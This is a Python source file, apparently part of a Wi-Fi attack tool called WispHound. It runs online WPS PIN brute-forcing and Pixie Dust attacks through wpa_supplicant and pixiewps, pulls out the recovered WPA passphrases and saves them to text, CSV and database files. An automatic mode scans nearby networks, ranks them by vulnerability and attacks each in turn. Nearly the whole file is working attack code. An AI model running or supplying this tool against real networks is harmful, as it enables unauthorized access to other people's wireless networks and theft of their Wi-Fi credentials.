                self.pixie_creds.e_hash2 = get_hex(line)
                if pixiemode:
                    print(f'[P] E-Hash2: {self.pixie_creds.e_hash2}')
            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.wpa_psk = bytes.fromhex(
                    get_hex(line)).decode('utf-8', errors='replace')
        elif ': State: ' in line:
            if '-> SCANNING' in line:
                self.connection_status.status = 'scanning'
                self.__print_with_indicators('*', 'Scanning…')
        elif 'WPS-FAIL' in line and self.connection_status.status != '':
            self.connection_status.status = 'WPS_FAIL'
            print('[-] wpa_supplicant returned WPS-FAIL')
        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'SSID' in line:
                self.connection_status.essid = self._extract_essid(line)
            self.__print_with_indicators('*', 'Authenticating…')
        elif 'Authentication response' in line:
            self.__print_with_indicators('*', 'Authenticated')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                self.connection_status.essid = self._extract_essid(line)
            self.__print_with_indicators('*', 'Associating with AP…')
        elif 'Associated with' in line and self.interface in line:
            b = line.split()[-1].upper()
            if self.connection_status.essid:
                self.__print_with_indicators(
                    '+', f'Associated with {b} '
                         f'(ESSID: {self.connection_status.essid})')
            else:
                self.__print_with_indicators('+', f'Associated with {b}')
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            self.__print_with_indicators('*', 'Sending EAPOL Start…')
        elif 'EAP entering state IDENTITY' in line:
            self.__print_with_indicators('*', 'Received Identity Request')
        elif 'using real identity' in line:
            self.__print_with_indicators('*', 'Sending Identity Response…')
        elif bssid and bssid in line.lower() and 'level=' in line:
            self.lastPwr = line.split('level=')[1].split(' ')[0]
            if 'noise=' in line:
                noise = line.split('noise=')[1].split(' ')[0]
                print(f'[i] Current signal: {self.lastPwr}, noise: {noise}')
            else:
                print(f'[i] Current signal: {self.lastPwr}')
        elif pbc_mode and ('selected BSS ' in line):
            b = line.split('selected BSS ')[-1].split()[0].upper()
            self.connection_status.bssid = b
            print(f'[*] Selected AP: {b}')

        return True

    @staticmethod
    def _extract_essid(line):
        try:
            raw = "'".join(line.split("'")[1:-1])
            return (codecs.decode(raw, 'unicode-escape')
                    .encode('latin1').decode('utf-8', errors='replace'))
        except Exception:
            return ''

    # ---- pixiewps invocation ---------------------------------------------
    def __runPixiewps(self, showcmd=False, full_range=False, _retry=True):
        self.__print_with_indicators('*', 'Running Pixiewps…')
        try:
            argv = self.pixie_creds.get_pixie_args(full_range)
        except ValueError as e:
            print(f'[!] Pixiewps data validation failed: {e}')
            return False

        if showcmd:
            print(' '.join(argv))
        self._emit_json('pixiewps_start', argv=argv, full_range=full_range)

        try:
            r = subprocess.run(
                argv, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                encoding='utf-8', errors='replace',
                timeout=self.pixiewps_timeout)
        except subprocess.TimeoutExpired:
            print(f'[!] pixiewps timed out after {self.pixiewps_timeout}s')
            self._emit_json('pixiewps_timeout',
                            timeout=self.pixiewps_timeout)
            return False
        except FileNotFoundError:
            print('[!] pixiewps binary not found in PATH')
            return False

        out = r.stdout or ''
        print(out)
        self._emit_json('pixiewps_output', rc=r.returncode, out=out)

        m = re.search(r"\[\+\]\s*WPS pin:\s*'?([^'\n\r]*)'?", out)
        if m:
            pin = m.group(1).strip()
            if pin == '<empty>':
                self._emit_json('pixiewps_result', pin='')
                return ''
            if pin.isdigit() and len(pin) == 8:
                self._emit_json('pixiewps_result', pin=pin)
                return pin
            if pin.isdigit() and len(pin) == 7:
                full = pin + str(self.generator.checksum(int(pin)))
                self._emit_json('pixiewps_result', pin=full)
                return full

        if _retry and not full_range and (
                'force' in out.lower() or 'full range' in out.lower()):
            print('[i] Retrying with --force (full range)…')
            return self.__runPixiewps(showcmd, full_range=True, _retry=False)

        return False

    # ---- persistence ------------------------------------------------------
    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
        print(f"[+] WPS PIN: '{wps_pin}'")
        print(f"[+] WPA PSK: '{wpa_psk}'")
        print(f"[+] AP SSID: '{essid}'")
        self._emit_json('credentials', wps_pin=wps_pin,
                        wpa_psk=wpa_psk, essid=essid)

    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
        os.makedirs(self.reports_dir, exist_ok=True)
        filename = self.reports_dir + 'stored'
        dateStr = datetime.now().strftime('%d.%m.%Y %H:%M')
        with open(filename + '.txt', 'a', encoding='utf-8') as f:
            f.write(f'{dateStr}\nBSSID: {bssid}\nESSID: {essid}\n'
                    f'WPS PIN: {wps_pin}\nWPA PSK: {wpa_psk}\n\n')
        header = not os.path.isfile(filename + '.csv')
        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as f:
            w = csv.writer(f, delimiter=';', quoting=csv.QUOTE_ALL)
            if header:
                w.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
            w.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
        print(f'[i] Credentials saved to {filename}.txt, {filename}.csv')
        self.db.save_credentials(bssid, essid, wps_pin, wpa_psk)
        self._emit_json('credentials_saved', bssid=bssid,
                        essid=essid, wps_pin=wps_pin, wpa_psk=wpa_psk)

    def __savePin(self, bssid, pin):
        filename = (self.pixiewps_dir
                    + f'{bssid.replace(":", "").upper()}.run')
        with open(filename, 'w') as f:
            f.write(pin)
        print(f'[i] PIN saved in {filename}')
        self._emit_json('pin_saved', bssid=bssid, pin=pin, path=filename)

    def __prompt_wpspin(self, bssid):
        pins = self.generator.getSuggestedUnique(bssid)
        if len(pins) > 1:
            print(f'PINs generated for {bssid} (deduplicated):')
            print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
            for i, pin in enumerate(pins):
                print('{:<3} {:<10} {:<}'.format(
                    f'{i + 1})', pin['pin'], pin['name']))
            while True:
                pinNo = input('Select the PIN: ')
                try:
                    idx = int(pinNo)
                    if 1 <= idx <= len(pins):
                        return pins[idx - 1]['pin']
                    raise IndexError
                except (ValueError, IndexError):
                    print('Invalid number')
        elif len(pins) == 1:
            print('[i] The only probable PIN is selected:', pins[0]['name'])
            return pins[0]['pin']
        return None

    # ---- core connection flow --------------------------------------------
    def __wps_connection(self, bssid=None, pin=None, pixiemode=False,
                         pbc_mode=False, verbose=None, max_retries=3):
        if verbose is None:
            verbose = self.print_debug
        self.pixie_creds.clear()
        self.connection_status.clear()
        try:
            self.wpas.stdout.read(300)
        except Exception:
            pass

        if pbc_mode:
            if bssid:
                print(f'[*] Starting WPS push button connection to {bssid}…')
                cmd = f'WPS_PBC {bssid}'
            else:
                print('[*] Starting WPS push button connection…')
                cmd = 'WPS_PBC'
        else:
            print(f"[*] Trying PIN '{pin}'…")
            cmd = f'WPS_REG {bssid} {pin}'

        for attempt in range(1, max_retries + 1):
            r = self.sendAndReceive(cmd)
            if 'OK' not in r:
                self.connection_status.status = 'WPS_FAIL'
                print(self._explain_wpas_not_ok_status(cmd, r))
                if attempt < max_retries:
                    back = 2 ** attempt
                    print(f'[!] Backing off {back}s '
                          f'(retry {attempt}/{max_retries})')
                    time.sleep(back)
                    continue
                return False

            while True:
                if not self.__handle_wpas(
                        pixiemode=pixiemode, pbc_mode=pbc_mode,
                        verbose=verbose, bssid=(bssid or '').lower()):
                    break
                if self.connection_status.status in (
                        'WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
                    break

            self.sendOnly('WPS_CANCEL')

            if self.connection_status.status == 'WPS_FAIL' \
                    and attempt < max_retries:
                back = 2 ** attempt
                print(f'[!] WPS transaction failed; backing off {back}s '
                      f'(retry {attempt}/{max_retries})')
                time.sleep(back)
                continue
            break

        # Lockout safety
        if self.connection_status.nack_count >= 3:
            print('[!] 3+ consecutive NACKs — possible AP lockout risk.')
            if self.cool_down > 0:
                print(f'[i] Cooling down {self.cool_down}s.')
                time.sleep(self.cool_down)
        return False

    # ---- single_connection -------------------------------------------------
    def single_connection(self, bssid=None, pin=None, pixiemode=False,
                          pbc_mode=False, showpixiecmd=False,
                          pixieforce=False, store_pin_on_fail=False):
        if not bssid:
            print('[!] No BSSID supplied to single_connection()')
            return False

        # DB reuse: try a previously stored PIN first
        if not pin and not pbc_mode:
            known = self.db.known_pin(bssid)
            if known:
                print(f'[i] Known PIN in DB for {bssid}: {known} '
                      f'— trying first.')
                pin = known

        # Pixie-vulnerability promotion
        if (not pixiemode and not pbc_mode and not pin
                and self.target_is_pixie_vuln):
            chipset = self.target_chipset or 'unknown chipset'
            print(f'[!] Target {bssid} looks Pixie Dust vulnerable ({chipset}).')
            ans = input('[?] Try Pixie Dust attack first? [Y/n] ').strip().lower()
            if ans != 'n':
                pixiemode = True

        if not pin:
            if pixiemode:
                try:
                    fn = (self.pixiewps_dir
                          + f'{bssid.replace(":", "").upper()}.run')
                    with open(fn, 'r') as f:
                        t_pin = f.readline().strip()
                    if input(f'[?] Use previously calculated PIN '
                             f'{t_pin}? [n/Y] ').lower() != 'n':
                        pin = t_pin
                    else:
                        raise FileNotFoundError
                except FileNotFoundError:
                    pin = self.generator.getLikely(bssid) or '12345670'
            elif not pbc_mode:
                pin = self.__prompt_wpspin(bssid) or '12345670'

        self.db.bump_attempts(bssid)

        if pbc_mode:
            self.__wps_connection(bssid, pbc_mode=True)
            bssid = getattr(self.connection_status, 'bssid', bssid) or bssid
            pin = '<PBC mode>'
        elif store_pin_on_fail:
            try:
                self.__wps_connection(bssid, pin, pixiemode)
            except KeyboardInterrupt:
                print('\nAborting…')
                self.__savePin(bssid, pin)
                return False
        else:
            self.__wps_connection(bssid, pin, pixiemode)

        if self.connection_status.status == 'GOT_PSK':
            self.__credentialPrint(
                pin, self.connection_status.wpa_psk,
                self.connection_status.essid)
            if self.save_result:
                self.__saveResult(bssid, self.connection_status.essid,
                                  pin, self.connection_status.wpa_psk)
            if not pbc_mode:
                try:
                    os.remove(self.pixiewps_dir
                              + f'{bssid.replace(":", "").upper()}.run')
                except FileNotFoundError:
                    pass
            return True
        elif pixiemode:
            if self.pixie_creds.got_all():
                pin = self.__runPixiewps(showpixiecmd, pixieforce)
                if pin is not False:
                    return self.single_connection(
                        bssid, pin, pixiemode=False,
                        store_pin_on_fail=True)
                return False
            print('[!] Not enough data to run Pixie Dust attack')
            return False
        else:
            if store_pin_on_fail:
                self.__savePin(bssid, pin)
            return False

    # ---- bruteforce -------------------------------------------------------
    def __first_half_bruteforce(self, bssid, f_half, delay=None):
        checksum = self.generator.checksum
        while int(f_half) < 10000:
            t = int(f_half + '000')
            pin = f'{f_half}000{checksum(t)}'
            self.single_connection(bssid, pin)
            if self.connection_status.isFirstHalfValid():
                print('[+] First half found')
                return f_half
            if self.connection_status.status == 'WPS_FAIL':
                print('[!] WPS transaction failed, re-trying last pin')
                return self.__first_half_bruteforce(bssid, f_half)
            f_half = str(int(f_half) + 1).zfill(4)
            self.bruteforce.registerAttempt(f_half)
            if delay:
                time.sleep(delay)
        print('[-] First half not found')
        return False

    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
        checksum = self.generator.checksum
        while int(s_half) < 1000:
            t = int(f_half + s_half)
            pin = f'{f_half}{s_half}{checksum(t)}'
            self.single_connection(bssid, pin)
            if self.connection_status.last_m_message > 6:
                return pin
            if self.connection_status.status == 'WPS_FAIL':
                print('[!] WPS transaction failed, re-trying last pin')
                return self.__second_half_bruteforce(bssid, f_half, s_half)
            s_half = str(int(s_half) + 1).zfill(3)
            self.bruteforce.registerAttempt(f_half + s_half)
            if delay:
                time.sleep(delay)
        return False

    def smart_bruteforce(self, bssid, start_pin=None, delay=None,
                         loop=False):
        if (not start_pin) or (len(start_pin) < 4):
            try:
                fn = (self.sessions_dir
                      + f'{bssid.replace(":", "").upper()}.run')
                with open(fn, 'r') as f:
                    if input(f'[?] Restore previous session for {bssid}? '
                             f'[n/Y] ').lower() != 'n':
                        mask = f.readline().strip()
                    else:
                        raise FileNotFoundError
            except FileNotFoundError:
                mask = '0000'
        else:
            mask = start_pin[:7]

        try:
            self.bruteforce = BruteforceStatus()
            self.bruteforce.mask = mask
            if len(mask) == 4:
                f_half = self.__first_half_bruteforce(bssid, mask, delay)
                if f_half and self.connection_status.status != 'GOT_PSK':
                    self.__second_half_bruteforce(bssid, f_half, '001', delay)
            elif len(mask) == 7:
                self.__second_half_bruteforce(
                    bssid, mask[:4], mask[4:], delay)
            raise KeyboardInterrupt
        except KeyboardInterrupt:
            print('\nAborting…')
            fn = (self.sessions_dir
                  + f'{bssid.replace(":", "").upper()}.run')
            with open(fn, 'w') as f:
                f.write(self.bruteforce.mask)
            print(f'[i] Session saved in {fn}')
            if loop:
                raise

    def __print_with_indicators(self, level, msg):
        print(f'[{level}] [{self.lastPwr}] {msg}')


# ---------------------------------------------------------------------------
# WiFiScanner
# ---------------------------------------------------------------------------
class WiFiScanner:
    def __init__(self, interface, vuln_list=None, reverse_scan=False,
                 db: Optional[TargetDB] = None):
        self.interface = interface
        self.vuln_list = vuln_list or []
        self.reverse_scan = reverse_scan
        self.db = db
        self.selected_vuln = False
        self.selected_chipset = ''

        self.stored = []
        reports = os.path.dirname(os.path.realpath(__file__)) \
            + '/reports/stored.csv'
        try:
            with open(reports, 'r', newline='',
                      encoding='utf-8', errors='replace') as f:
                r = csv.reader(f, delimiter=';', quoting=csv.QUOTE_ALL)
                next(r, None)
                for row in r:
                    if len(row) >= 3:
                        self.stored.append((row[1], row[2]))
        except FileNotFoundError:
            pass

    @staticmethod
    def _classify_pixie_vuln(network):
        haystack = ' '.join([
            network.get('Model', ''),
            network.get('Model number', ''),
            network.get('Device name', ''),
        ]).upper()
        for keyword, label in PIXIE_VULNERABLE_CHIPSETS.items():
            if keyword.upper() in haystack:
                return True, label
        return False, ''

    def iw_scanner(self) -> Optional[Dict[int, dict]]:
        def handle_network(line, result, networks):
            networks.append({
                'Security type': 'Unknown', 'WPS': False,
                'WPS locked': False, 'Model': '',
                'Model number': '', 'Device name': '',
            })
            networks[-1]['BSSID'] = result.group(1).upper()

        def _decode(d):
            return (codecs.decode(d, 'unicode-escape')
                    .encode('latin1').decode('utf-8', errors='replace'))

        def handle_essid(line, result, networks):
            networks[-1]['ESSID'] = _decode(result.group(1))

        def handle_level(line, result, networks):
            networks[-1]['Level'] = int(float(result.group(1)))

        def handle_securityType(line, result, networks):
            sec = networks[-1]['Security type']
            if result.group(1) == 'capability':
                sec = 'WEP' if 'Privacy' in result.group(2) else 'Open'
            elif sec == 'WEP':
                if result.group(1) == 'RSN':
                    sec = 'WPA2'
                elif result.group(1) == 'WPA':
                    sec = 'WPA'
            elif sec == 'WPA' and result.group(1) == 'RSN':
                sec = 'WPA/WPA2'
            elif sec == 'WPA2' and result.group(1) == 'WPA':
                sec = 'WPA/WPA2'
            networks[-1]['Security type'] = sec

        def handle_wps(line, result, networks):
            networks[-1]['WPS'] = result.group(1)

        def handle_wpsLocked(line, result, networks):
            if int(result.group(1), 16):
                networks[-1]['WPS locked'] = True

        def handle_model(line, result, networks):
            networks[-1]['Model'] = _decode(result.group(1))

        def handle_modelNumber(line, result, networks):
            networks[-1]['Model number'] = _decode(result.group(1))

        def handle_deviceName(line, result, networks):
            networks[-1]['Device name'] = _decode(result.group(1))

        cmd = f'iw dev {self.interface} scan'
        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT,
                              encoding='utf-8', errors='replace')
        lines = proc.stdout.splitlines()
        networks = []
        matchers = {
            re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
            re.compile(r'SSID: (.*)'): handle_essid,
            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
            re.compile(r'(capability): (.+)'): handle_securityType,
            re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
            re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
            re.compile(r' [*] Model: (.*)'): handle_model,
            re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
            re.compile(r' [*] Device name: (.*)'): handle_deviceName,
        }

        for line in lines:
            if line.startswith('command failed:'):
                print('[!] Error:', line)
                return False
            line = line.strip('\t')
            for regexp, handler in matchers.items():
                m = re.match(regexp, line)
                if m:
                    handler(line, m, networks)

        networks = [n for n in networks if n['WPS']]
        if not networks:
            return False

        for net in networks:
            vuln, chipset = self._classify_pixie_vuln(net)
            net['Pixie vulnerable'] = vuln
            net['Chipset'] = chipset
            if self.db:
                net['Vendor'] = self.db.vendor_for(net['BSSID'])
                self.db.upsert(net)

        networks.sort(key=lambda x: (not x['Pixie vulnerable'],
                                     x['WPS locked'], -x['Level']))
        network_list = {(i + 1): n for i, n in enumerate(networks)}

        # ---- printing ----
        def truncateStr(s, length, postfix='…'):
            width = wcwidth.wcswidth(s)
            if width <= length:
                return s + ' ' * (length - width)
            postfix_w = wcwidth.wcswidth(postfix)
            out, cur = [], 0
            for c in s:
                cw = wcwidth.wcswidth(c)
                if cur + cw > length - postfix_w:
                    break
                out.append(c)
                cur += cw
            res = ''.join(out)
            if len(out) < len(s):
                res += postfix
            rw = wcwidth.wcswidth(res)
            return res + ' ' * max(0, length - rw)

        def colored(text, color=None):
            codes = {'green': '\033[92m', 'red': '\033[91m',
                     'yellow': '\033[93m', 'cyan': '\033[96m'}
            if color in codes:
                return f'{codes[color]}{text}\033[00m'
            return text

        if self.vuln_list:
            print('Network marks: {1} {0} {2} {0} {3} {0} {4}'.format(
                '|',
                colored('Possibly vulnerable', 'green'),
                colored('WPS locked', 'red'),
                colored('Already stored', 'yellow'),
                colored('Pixie-vulnerable', 'cyan')))
        print('Networks list:')
        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR',
            'WSC device name', 'WSC model'))

        items = list(network_list.items())
        if self.reverse_scan:
            items = items[::-1]
        for n, net in items:
            model = f"{net['Model']} {net['Model number']}".strip()
            essid = truncateStr(net.get('ESSID', 'HIDDEN'), 25)
            dev = truncateStr(net['Device name'], 27)
            line = ' '.join([
                truncateStr(f'{n})', 4),
                truncateStr(net['BSSID'], 18),
                essid,
                truncateStr(net['Security type'], 8),
                truncateStr(str(net['Level']), 4),
                dev,
                model,
            ])
            if net.get('Pixie vulnerable'):
                print(colored(line, 'cyan'))
            elif (net['BSSID'], net.get('ESSID', 'HIDDEN')) in self.stored:
                print(colored(line, 'yellow'))
            elif net['WPS locked']:
                print(colored(line, 'red'))
            elif self.vuln_list and model in self.vuln_list:
                print(colored(line, 'green'))
            else:
                print(line)

        return network_list

    def prompt_network(self):
        networks = self.iw_scanner()
        if not networks:
            print('[-] No WPS networks found.')
            return None
        while True:
            try:
                choice = input('Select target (press Enter to refresh): ')
                if choice.lower() in ('r', '0', ''):
                    return self.prompt_network()
                idx = int(choice)
                if idx in networks:
                    target = networks[idx]
                    self.selected_vuln = target.get('Pixie vulnerable', False)
                    self.selected_chipset = target.get('Chipset', '')
                    return target['BSSID']
                raise IndexError
            except (ValueError, IndexError):
                print('Invalid number')


# ---------------------------------------------------------------------------
# Auto pipeline
# ---------------------------------------------------------------------------
def auto_exploit(interface, args, db):
    scanner = WiFiScanner(interface, [], reverse_scan=False, db=db)
    networks = scanner.iw_scanner()
    if not networks:
        print('[-] No WPS networks.')
        return
    order = sorted(networks.values(),
                   key=lambda n: (not n['Pixie vulnerable'],
                                  n['WPS locked'], -n['Level']))
    for net in order:
        if net['WPS locked']:
            print(f"[i] Skipping {net['BSSID']} (WPS locked)")
            continue
        if args.pixie_only and not net['Pixie vulnerable']:
            continue
        print(f"\n=== Attacking {net['BSSID']} "
              f"({net.get('ESSID', 'HIDDEN')}) ===")
        comp = Companion(interface, save_result=args.write,
                         print_debug=args.verbose, db=db,
                         json_mode=args.json,
                         trace_log=args.trace_log,
                         pixiewps_timeout=args.timeout,
                         cool_down=args.cool)
        comp.target_is_pixie_vuln = net['Pixie vulnerable']
        comp.target_chipset = net.get('Chipset', '')
        try:
            if net['Pixie vulnerable']:
                comp.single_connection(net['BSSID'], pixiemode=True,
                                       showpixiecmd=args.show_pixie_cmd,
                                       pixieforce=args.pixie_force,
                                       store_pin_on_fail=True)
            else:
                comp.single_connection(net['BSSID'],
                                       showpixiecmd=args.show_pixie_cmd,
                                       pixieforce=args.pixie_force)
        except KeyboardInterrupt:
            print('\n[!] Interrupted.')
            break
        finally:
            comp.cleanup()


# ---------------------------------------------------------------------------
# Utility
# ---------------------------------------------------------------------------
def ifaceUp(iface, down=False):
    action = 'down' if down else 'up'
    return subprocess.run(f'ip link set {iface} {action}', shell=True,
                          stdout=sys.stdout, stderr=sys.stdout).returncode == 0


def die(msg):
    sys.stderr.write(msg + '\n')
    sys.exit(1)


def usage():
    return f"""
WispHound {VERSION} — WPS reconnaissance and Pixie Dust prioritization

%(prog)s <arguments>

Required arguments:
    -i, --interface=<wlan0>   Name of the interface to use

Optional arguments:
    -b, --bssid=<mac>         BSSID of the target AP
    -p, --pin=<wps pin>       Use the specified pin (arbitrary string or 4/8 digit pin)
    -K, --pixie-dust          Run Pixie Dust attack
    -B, --bruteforce          Run online bruteforce attack
    --push-button-connect     Run WPS push button connection
    -A, --auto                Scan → rank → attack each Pixie-vulnerable target

Advanced arguments:
    -d, --delay=<n>           Delay between pin attempts [0]
    -w, --write               Write AP credentials to the file on success
    -F, --pixie-force         Run Pixiewps with --force (full range)
    -X, --show-pixie-cmd      Always print Pixiewps command
    --vuln-list=<filename>    Custom file with vulnerable devices list
    --iface-down              Bring interface down on exit
    -l, --loop                Run in a loop
    -r, --reverse-scan        Reverse order of networks in scan list
    --mtk-wifi                Activate MediaTek Wi-Fi driver
    -v, --verbose             Verbose output

Persistence & output:
    --db=<path>               SQLite target database (default ~/.WispHound/targets.db)
    -J, --json                Emit JSON lines for structured consumption
    --trace-log=<file>        Tee raw wpa_supplicant output to a file
    --oui=<path>              Additional OUI vendor file (prefix<tab>vendor)

Safety & timing:
    --timeout=<sec>           pixiewps timeout (default 120)
    --cool=<sec>              Cool-down after 3 NACKs (default 60)
    --no-lockout-check        Skip lockout safety (not recommended)
    --pixie-only              In --auto mode, only attack Pixie-vulnerable targets
"""


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description=f'WispHound {VERSION} — WPS reconnaissance and '
                    'Pixie Dust prioritization',
        epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K')
    parser.add_argument('-i', '--interface', required=True,
                        help='Name of the interface to use')
    parser.add_argument('-b', '--bssid', help='BSSID of the target AP')
    parser.add_argument('-p', '--pin',
                        help='Use the specified pin (arbitrary string or 4/8 digit pin)')
    parser.add_argument('-K', '--pixie-dust', action='store_true',
                        help='Run Pixie Dust attack')
    parser.add_argument('-F', '--pixie-force', action='store_true',
                        help='Run Pixiewps with --force (full range)')
    parser.add_argument('-X', '--show-pixie-cmd', action='store_true',
                        help='Always print Pixiewps command')
    parser.add_argument('-B', '--bruteforce', action='store_true',
                        help='Run online bruteforce attack')
    parser.add_argument('--pbc', '--push-button-connect', action='store_true',
                        help='Run WPS push button connection')
    parser.add_argument('-d', '--delay', type=float,
                        help='Delay between pin attempts')
    parser.add_argument('-w', '--write', action='store_true',
                        help='Write credentials to the file on success')
    parser.add_argument('--iface-down', action='store_true',
                        help='Down network interface when finished')
    parser.add_argument('--vuln-list', type=str,
                        default=os.path.dirname(os.path.realpath(__file__))
                        + '/vulnwsc.txt',
                        help='Custom file with vulnerable devices list')
    parser.add_argument('-l', '--loop', action='store_true',
                        help='Run in a loop')
    parser.add_argument('-r', '--reverse-scan', action='store_true',
                        help='Reverse order of networks in scan list')
    parser.add_argument('--mtk-wifi', action='store_true',
                        help='Activate MediaTek Wi-Fi driver on startup')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Verbose output')
    parser.add_argument('-A', '--auto', action='store_true',
                        help='Scan → rank → attack each Pixie-vulnerable target')
    parser.add_argument('--pixie-only', action='store_true',
                        help='In --auto, only attack Pixie-vulnerable targets')
    parser.add_argument('-J', '--json', action='store_true',
                        help='Emit JSON lines for credentials / scan events')
    parser.add_argument('--db', type=str,
                        default=os.path.expanduser('~/.WispHound/targets.db'),
                        help='SQLite target database')
    parser.add_argument('--trace-log', type=str, default=None,
                        help='Tee raw wpa_supplicant output to a file')
    parser.add_argument('--oui', type=str, default=None,
                        help='Additional OUI vendor file')
    parser.add_argument('--timeout', type=int, default=120,
                        help='pixiewps timeout in seconds (default 120)')
    parser.add_argument('--cool', type=int, default=60,
                        help='Cool-down seconds after 3 NACKs (default 60)')
    parser.add_argument('--no-lockout-check', action='store_true',
                        help='Skip lockout safety (not recommended)')

    args = parser.parse_args()

    if sys.hexversion < 0x03060F0:
        die('The program requires Python 3.6 and above')
    if os.getuid() != 0:
        die('Run it as root')

    if args.mtk_wifi:
        dev = Path('/dev/wmtWifi')
        if not dev.is_char_device():
            die('Unable to activate MediaTek Wi-Fi device (--mtk-wifi): '
                '/dev/wmtWifi does not exist or is not a character device')
        dev.chmod(0o644)
        dev.write_text('1')

    if not ifaceUp(args.interface):
        die(f'Unable to up interface "{args.interface}"')

    if args.no_lockout_check:
        args.cool = 0

    db = TargetDB(args.db)
    if args.oui:
        try:
            db.load_oui_file(args.oui)
        except FileNotFoundError:
            print(f'[!] OUI file not found: {args.oui}')

    try:
        if args.auto:
            auto_exploit(args.interface, args, db)
            sys.exit(0)

        while True:
            try:
                comp = Companion(
                    args.interface, args.write,
                    print_debug=args.verbose, db=db,
                    json_mode=args.json, trace_log=args.trace_log,
                    pixiewps_timeout=args.timeout, cool_down=args.cool)

                selected_vuln = False
                selected_chipset = ''

                if args.pbc:
                    comp.single_connection(pbc_mode=True)
                else:
                    if not args.bssid:
                        try:
                            with open(args.vuln_list, 'r',
                                      encoding='utf-8') as f:
                                vuln_list = f.read().splitlines()
                        except FileNotFoundError:
                            vuln_list = []
                        scanner = WiFiScanner(
                            args.interface, vuln_list,
                            reverse_scan=args.reverse_scan, db=db)
                        if not args.loop:
                            print('[*] BSSID not specified (--bssid) — '
                                  'scanning for available networks')
                        args.bssid = scanner.prompt_network()
                        selected_vuln = scanner.selected_vuln
                        selected_chipset = scanner.selected_chipset

                    if args.bssid:
                        comp.target_is_pixie_vuln = selected_vuln
                        comp.target_chipset = selected_chipset
                        if args.bruteforce:
                            comp.smart_bruteforce(
                                args.bssid, args.pin, args.delay,
                                loop=args.loop)
                        else:
                            comp.single_connection(
                                args.bssid, args.pin, args.pixie_dust,
                                args.pbc, args.show_pixie_cmd,
                                args.pixie_force)
                comp.cleanup()
                if not args.loop:
                    break
                args.bssid = None
            except KeyboardInterrupt:
                if args.loop:
                    if input('\n[?] Exit the script '
                             '(otherwise continue to AP scan)? [N/y] '
                             ).lower() == 'y':
                        print('Aborting…')
                        break
                    args.bssid = None
                else:
                    print('\nAborting…')
                    break
    finally:
        if args.iface_down:
            ifaceUp(args.interface, down=True)
        if args.mtk_wifi:
            try:
                Path('/dev/wmtWifi').write_text('0')
            except Exception:
                pass
        db.close()
